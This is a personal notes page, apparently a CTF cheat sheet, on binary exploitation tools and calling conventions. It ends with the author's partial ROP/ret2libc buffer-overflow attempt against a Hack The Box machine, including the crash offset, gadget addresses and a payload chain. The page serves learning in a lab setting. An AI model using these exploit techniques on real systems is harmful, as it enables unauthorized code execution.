<h4 id="one_gadget"><a href="https://github.com/david942j/one_gadget">one_gadget</a><a class="headerlink" href="#one_gadget" title="Permanent link">&para;</a></h4>
<p>tool for finding one gadget RCE in libc.so.6</p>
<div class="codehilite"><pre><span></span><code>one_gadget binary_name
gem install one_gadget
</code></pre></div>

<h4 id="ropgadget"><a href="https://github.com/JonathanSalwan/ROPgadget">ropgadget</a><a class="headerlink" href="#ropgadget" title="Permanent link">&para;</a></h4>
<p>search your gadgets on your binaries to facilitate your ROP exploitation</p>
<h4 id="objdump">objdump<a class="headerlink" href="#objdump" title="Permanent link">&para;</a></h4>
<p>display information from object files.</p>
<div class="codehilite"><pre><span></span><code>objdump -D filename
</code></pre></div>

<h4 id="pwntools-checksec">pwntools - checksec<a class="headerlink" href="#pwntools-checksec" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code>checksec filename
pwn checksec filename
</code></pre></div>

<h4 id="pwntools-cyclic">pwntools - cyclic<a class="headerlink" href="#pwntools-cyclic" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code>pwn cyclic 40
pwn cyclic -l 0x61676161
</code></pre></div>

<h4 id="dmesg-print-or-control-the-kernel-ring-buffer">dmesg - print or control the kernel ring buffer<a class="headerlink" href="#dmesg-print-or-control-the-kernel-ring-buffer" title="Permanent link">&para;</a></h4>
<p>dmesg |tail</p>
<h4 id="readelf">readelf<a class="headerlink" href="#readelf" title="Permanent link">&para;</a></h4>
<p>Displays information about ELF files.<br>
<code>readelf -s filename</code></p>
<div class="codehilite"><pre><span></span><code>readelf [-a|--all]
        [-h|--file-header]
        [-l|--program-headers|--segments]
        [-S|--section-headers|--sections]
        [-g|--section-groups]
        [-t|--section-details]
        [-e|--headers]
        [-s|--syms|--symbols]
        [--dyn-syms]
        [-n|--notes]
        [-r|--relocs]
        [-u|--unwind]
        [-d|--dynamic]
        [-V|--version-info]
        [-A|--arch-specific]
        [-D|--use-dynamic]
        [-x &lt;number or name&gt;|--hex-dump=&lt;number or name&gt;]
        [-p &lt;number or name&gt;|--string-dump=&lt;number or name&gt;]
        [-R &lt;number or name&gt;|--relocated-dump=&lt;number or name&gt;]
        [-z|--decompress]
        [-c|--archive-index]
        [-w[lLiaprmfFsoRtUuTgAckK]|
         --debug-dump[=rawline,=decodedline,=info,=abbrev,=pubnames,=aranges,=macro,=frames,=frames-interp,=str,=loc,=Ranges,=pubtypes,=trace_info,=trace_abbrev,=trace_aranges,=gdb_index,=addr,=cu_index,=links,=follow-links]]
        [--dwarf-depth=n]
        [--dwarf-start=n]
        [-I|--histogram]
        [-v|--version]
        [-W|--wide]
        [-H|--help]
        elffile...
</code></pre></div>

<h4 id="gdb">GDB:<a class="headerlink" href="#gdb" title="Permanent link">&para;</a></h4>
<ul>
<li>dumprop -- Dump all ROP gadgets in specific memory range</li>
<li>list registers:<ul>
<li>info registers - shows all the registers</li>
<li>info registers eax - shows just the register eax</li>
<li>The command can be abbreviated as i r</li>
</ul>
</li>
</ul>
<h4 id="vmmap">vmmap<a class="headerlink" href="#vmmap" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code>gdb-peda$ help vmmap
Get virtual mapping address ranges of section(s) in debugged process
Usage:
    vmmap [mapname] (e.g binary, all, libc, stack)
    vmmap address (find mapname contains this address)
    vmmap (equiv to cat /proc/pid/maps)
</code></pre></div>

<h4 id="rabin2"><a href="https://radare.gitbooks.io/radare2book/content/tools/rabin2/intro.html">Rabin2</a><a class="headerlink" href="#rabin2" title="Permanent link">&para;</a></h4>
<p>Show Properties of a Binary</p>
<p>A few useful options:</p>
<div class="codehilite"><pre><span></span><code>-E              globally exportable symbols
-g              same as -SMZIHVResizcld (show all info)
-H              header fields
-i              imports (symbols imported from libraries)
-I              binary info
-j              output in json
-K [algo]       calculate checksums (md5, sha1, ..)
-l              linked libraries
-L [plugin]     list supported bin plugins or plugin details
-m [addr]       show source line at addr
-M              main (show address of main symbol)
-n [str]        show section, symbol or import named str
-N [min:max]    force min:max number of chars per string (see -z and -zz)
-s              symbols
-S              sections
-z              strings (from data section)
-zz             strings (from raw bins [e bin.rawstr=1])
-zzz            dump raw strings to stdout (for huge files)
</code></pre></div>

<h4 id="calling-conventions">Calling Conventions<a class="headerlink" href="#calling-conventions" title="Permanent link">&para;</a></h4>
<p>(<a href="https://ctf101.org/binary-exploitation/what-are-calling-conventions/">https://ctf101.org/binary-exploitation/what-are-calling-conventions/</a>)</p>
<p>cdecl
In 32-bit binaries on Linux, function arguments are passed in on the stack in reverse order. A function like this:</p>
<div class="codehilite"><pre><span></span><code><span class="kt">int</span><span class="w"> </span><span class="nf">add</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">a</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">b</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">c</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">c</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<p>would be invoked by pushing c, then b, then a.</p>
<p>SysV</p>
<p>For 64-bit binaries, function arguments are first passed in certain registers:</p>
<ol>
<li>RDI</li>
<li>RSI</li>
<li>RDX</li>
<li>RCX</li>
<li>R8</li>
<li>R9</li>
</ol>
<p>then any leftover arguments are pushed onto the stack in reverse order, as in cdecl.</p>
<div class="codehilite"><pre><span></span><code>+---------+------+------+------+------+------+------+
| syscall | arg0 | arg1 | arg2 | arg3 | arg4 | arg5 |
+---------+------+------+------+------+------+------+
|   %rax  | %rdi | %rsi | %rdx | %r10 | %r8  | %r9  |
+---------+------+------+------+------+------+------+
</code></pre></div>

<table>
<thead>
<tr>
<th>8-byte register</th>
<th>Bytes 0-3</th>
<th>Bytes 0-1</th>
<th>Byte 0</th>
</tr>
</thead>
<tbody>
<tr>
<td>%rax</td>
<td>%eax</td>
<td>%ax</td>
<td>%al</td>
</tr>
<tr>
<td>%rcx</td>
<td>%ecx</td>
<td>%cx</td>
<td>%cl</td>
</tr>
<tr>
<td>%rdx</td>
<td>%edx</td>
<td>%dx</td>
<td>%dl</td>
</tr>
<tr>
<td>%rbx</td>
<td>%ebx</td>
<td>%bx</td>
<td>%bl</td>
</tr>
<tr>
<td>%rsi</td>
<td>%esi</td>
<td>%si</td>
<td>%sil</td>
</tr>
<tr>
<td>%rdi</td>
<td>%edi</td>
<td>%di</td>
<td>%dil</td>
</tr>
<tr>
<td>%rsp</td>
<td>%esp</td>
<td>%sp</td>
<td>%spl</td>
</tr>
<tr>
<td>%rbp</td>
<td>%ebp</td>
<td>%bp</td>
<td>%bpl</td>
</tr>
<tr>
<td>%r8</td>
<td>%r8d</td>
<td>%r8w</td>
<td>%r8b</td>
</tr>
<tr>
<td>%r9</td>
<td>%r9d</td>
<td>%r9w</td>
<td>%r9b</td>
</tr>
<tr>
<td>%r10</td>
<td>%r10d</td>
<td>%r10w</td>
<td>%r10b</td>
</tr>
<tr>
<td>%r11</td>
<td>%r11d</td>
<td>%r11w</td>
<td>%r11b</td>
</tr>
<tr>
<td>%r12</td>
<td>%r12d</td>
<td>%r12w</td>
<td>%r12b</td>
</tr>
<tr>
<td>%r13</td>
<td>%r13d</td>
<td>%r13w</td>
<td>%r13b</td>
</tr>
<tr>
<td>%r14</td>
<td>%r14d</td>
<td>%r14w</td>
<td>%r14b</td>
</tr>
<tr>
<td>%r15</td>
<td>%r15d</td>
<td>%r15w</td>
<td>%r15b</td>
</tr>
</tbody>
</table>
<p>32 bit:</p>
<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./filename&#39;</span><span class="p">)</span>
<span class="c1">#p = elf.process()</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;hostname.address&#39;</span><span class="p">,</span> <span class="n">port_number</span><span class="p">)</span>

<span class="n">address_of_desired_func</span>
<span class="n">junk</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">22</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">junk</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">address_of_desired_func</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>

<h3 id="miscellaneous-notes">Miscellaneous notes:<a class="headerlink" href="#miscellaneous-notes" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://blog.techorganic.com/2015/04/10/64-bit-linux-stack-smashing-tutorial-part-1/">https://blog.techorganic.com/2015/04/10/64-bit-linux-stack-smashing-tutorial-part-1/</a></li>
<li><a href="https://github.com/longld/peda">https://github.com/longld/peda</a></li>
</ul>
<h3 id="resources">Resources:<a class="headerlink" href="#resources" title="Permanent link">&para;</a></h3>
<ul>
<li>pwntools<ul>
<li><a href="https://buildmedia.readthedocs.org/media/pdf/pwntools/stable/pwntools.pdf">https://buildmedia.readthedocs.org/media/pdf/pwntools/stable/pwntools.pdf</a></li>
<li><a href="http://docs.pwntools.com/en/stable/rop/rop.html">http://docs.pwntools.com/en/stable/rop/rop.html</a></li>
<li><a href="https://github.com/Gallopsled/pwntools-tutorial">https://github.com/Gallopsled/pwntools-tutorial</a></li>
</ul>
</li>
<li><a href="https://www.cs.stevens.edu/~jschauma/631A/elf.html">https://www.cs.stevens.edu/~jschauma/631A/elf.html</a></li>
<li><a href="https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf">x64 Cheat Sheet</a></li>
<li><a href="https://reboare.github.io/bof/linux-stack-bof-3.html">https://reboare.github.io/bof/linux-stack-bof-3.html</a></li>
<li><a href="https://www.codetd.com/en/article/6763308">https://www.codetd.com/en/article/6763308</a></li>
<li><a href="https://ctf101.org/binary-exploitation/return-oriented-programming/">https://ctf101.org/binary-exploitation/return-oriented-programming/</a></li>
<li><a href="https://medium.com/@iseethieves/intro-to-rop-rop-emporium-split-9b2ec6d4db08">https://medium.com/@iseethieves/intro-to-rop-rop-emporium-split-9b2ec6d4db08</a></li>
<li><a href="https://reboare.github.io/bof/linux-stack-bof-2.html">https://reboare.github.io/bof/linux-stack-bof-2.html</a></li>
<li><a href="https://stackoverflow.com/questions/44556590/how-can-i-exploit-a-buffer-overflow">https://stackoverflow.com/questions/44556590/how-can-i-exploit-a-buffer-overflow</a></li>
<li><a href="https://gist.github.com/superkojiman/6a6e44db390d6dfc329a">https://gist.github.com/superkojiman/6a6e44db390d6dfc329a</a></li>
<li><a href="https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/">https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/</a></li>
<li><a href="https://gist.github.com/apolloclark/6cffb33f179cc9162d0a">https://gist.github.com/apolloclark/6cffb33f179cc9162d0a</a></li>
<li><a href="https://www.exploit-db.com/docs/english/28475-linux-stack-based-buffer-overflows.pdf">https://www.exploit-db.com/docs/english/28475-linux-stack-based-buffer-overflows.pdf</a></li>
<li><a href="https://www.exploit-db.com/docs/english/28479-return-oriented-programming-(rop-ftw).pdf">https://www.exploit-db.com/docs/english/28479-return-oriented-programming-(rop-ftw).pdf</a></li>
<li><a href="https://dl.packetstormsecurity.net/papers/attack/64bit-overflow.pdf">https://dl.packetstormsecurity.net/papers/attack/64bit-overflow.pdf</a></li>
<li><a href="https://turkeyland.net/projects/overflow/shell.php">https://turkeyland.net/projects/overflow/shell.php</a></li>
<li><a href="https://resources.infosecinstitute.com/return-oriented-programming-rop-attacks/#gref">https://resources.infosecinstitute.com/return-oriented-programming-rop-attacks/#gref</a></li>
<li><a href="https://nandynarwhals.org/ret2libc-namedpipes/">https://nandynarwhals.org/ret2libc-namedpipes/</a></li>
<li><a href="https://penturalabs.wordpress.com/2011/03/31/vulnerability-development-buffer-overflows-how-to-bypass-full-aslr/">https://penturalabs.wordpress.com/2011/03/31/vulnerability-development-buffer-overflows-how-to-bypass-full-aslr/</a></li>
</ul>
<h3 id="write-ups">Write-ups<a class="headerlink" href="#write-ups" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://github.com/PlatyPew/picoctf-2018-writeup/tree/master/Binary%20Exploitation/rop%20chain">https://github.com/PlatyPew/picoctf-2018-writeup/tree/master/Binary%20Exploitation/rop%20chain</a></li>
</ul>
<h3 id="to-sort">To Sort:<a class="headerlink" href="#to-sort" title="Permanent link">&para;</a></h3>
<p>objdump -D myapp
objdump -x myapp
ropper --file myapp
ropper --file myapp --search "pop rdi"
readelf -s myapp</p>
<p>ROPgadget --binary myapp --only "mov|pop|ret"</p>
<p>readelf --sections myapp</p>
<p>rabin2 -S myapp</p>
<p>r2:
pd @ sym.test
iz
/R pop
iS
/R pop rdi
i</p>
<p>db sym.main
ood</p>
<p>gdb:</p>
<div class="codehilite"><pre><span></span><code>gdb ./myapp

gdb-peda$ set follow-fork-mode parent
gdb-peda$ b main
gdb-peda$ r


gdb-peda$ x/x
0x7fffffffe1c0: 0x0000000000401070

gdb-peda$ rip
Undefined command: &quot;rip&quot;.  Try &quot;help&quot;.
gdb-peda$ $rip
Undefined command: &quot;$rip&quot;.  Try &quot;help&quot;.
gdb-peda$ $esp
Undefined command: &quot;$esp&quot;.  Try &quot;help&quot;.
gdb-peda$ p $rip
$1 = (void (*)()) 0x401163 &lt;main+4&gt;

gdb-peda$ disassemble
gdb-peda$ vmmap binary
gdb-peda$ vmmap all
gdb-peda$ checksec

gdb-peda$ find &quot;bin&quot;
gdb-peda$ find &quot;/bin/&quot;

gdb-peda$ info functions

gdb-peda$ disassemble test

gdb-peda$ set disassembly-flavor intel
info registers
</code></pre></div>

<hr />
<h2 id="my-initial-attempts-at-the-bof">My initial attempts at the BoF<a class="headerlink" href="#my-initial-attempts-at-the-bof" title="Permanent link">&para;</a></h2>
<p><a href="https://ctf101.org/binary-exploitation/return-oriented-programming/">https://ctf101.org/binary-exploitation/return-oriented-programming/</a></p>
<div class="codehilite"><pre><span></span><code>gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
gdb-peda$ set follow-fork-mode parent

gdb-peda$ pattern create 200
&#39;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&#39;
gdb-peda$ r
Starting program: /root/Documents/htb/boxes/safe/myapp
[Detaching after fork from child process 30278]
 02:03:30 up 1 day, 31 min,  1 user,  load average: 0.10, 0.17, 0.19

What do you want me to echo back? AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA

Program received signal SIGSEGV, Segmentation fault.

gdb-peda$ x/xg $rsp
0x7fffffffe158: 0x414f41413941416a

gdb-peda$ pattern offset 0x414f41413941416a
4706051884014715242 found at offset: 120
</code></pre></div>

<p>junk = "A" * 120</p>
<div class="codehilite"><pre><span></span><code>root@kali:~/Documents/htb/boxes/safe# ropper --file myapp --search &quot;pop rdi&quot;
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: myapp
0x0000000000401090: pop rdi; adc dword ptr [rax], eax; call qword ptr [rip + 0x2f56]; hlt; nop dword ptr [rax + rax]; ret;
0x000000000040120b: pop rdi; ret;
</code></pre></div>

<p>pop_rdi = 0x40120b</p>
<p>Address of main</p>
<div class="codehilite"><pre><span></span><code>root@kali:~/Documents/htb/boxes/safe# objdump -D myapp|grep main
  401094:   ff 15 56 2f 00 00       callq  *0x2f56(%rip)        # 403ff0 &lt;__libc_start_main@GLIBC_2.2.5&gt;
000000000040115f &lt;main&gt;:
</code></pre></div>

<p>main - 0x40115f</p>
<div class="codehilite"><pre><span></span><code>root@kali:~/Documents/htb/boxes/safe# objdump -D myapp|grep puts
0000000000401030 &lt;puts@plt&gt;:
  401030:   ff 25 e2 2f 00 00       jmpq   *0x2fe2(%rip)        # 404018 &lt;puts@GLIBC_2.2.5&gt;
  4011a1:   e8 8a fe ff ff          callq  401030 &lt;puts@plt&gt;
</code></pre></div>

<p>plt (procedural link table) - 0x401030
got (global offset table) - 0x404018</p>
<p>payload = junk + pop_rdi + got_put + plt_put + main</p>
<div class="codehilite"><pre><span></span><code>payload = &quot;A&quot;*120 + 0x40120b + 0x404018 + 0x401030 + 0x40115f
</code></pre></div>





                
              </article>
            </div>
          
          
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    <script id="__config" type="application/json">{"base": "../..", "features": [], "search": "../../assets/javascripts/workers/search.208ed371.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../assets/javascripts/bundle.b425cdc4.min.js"></script>
      
    
  </body>
</html>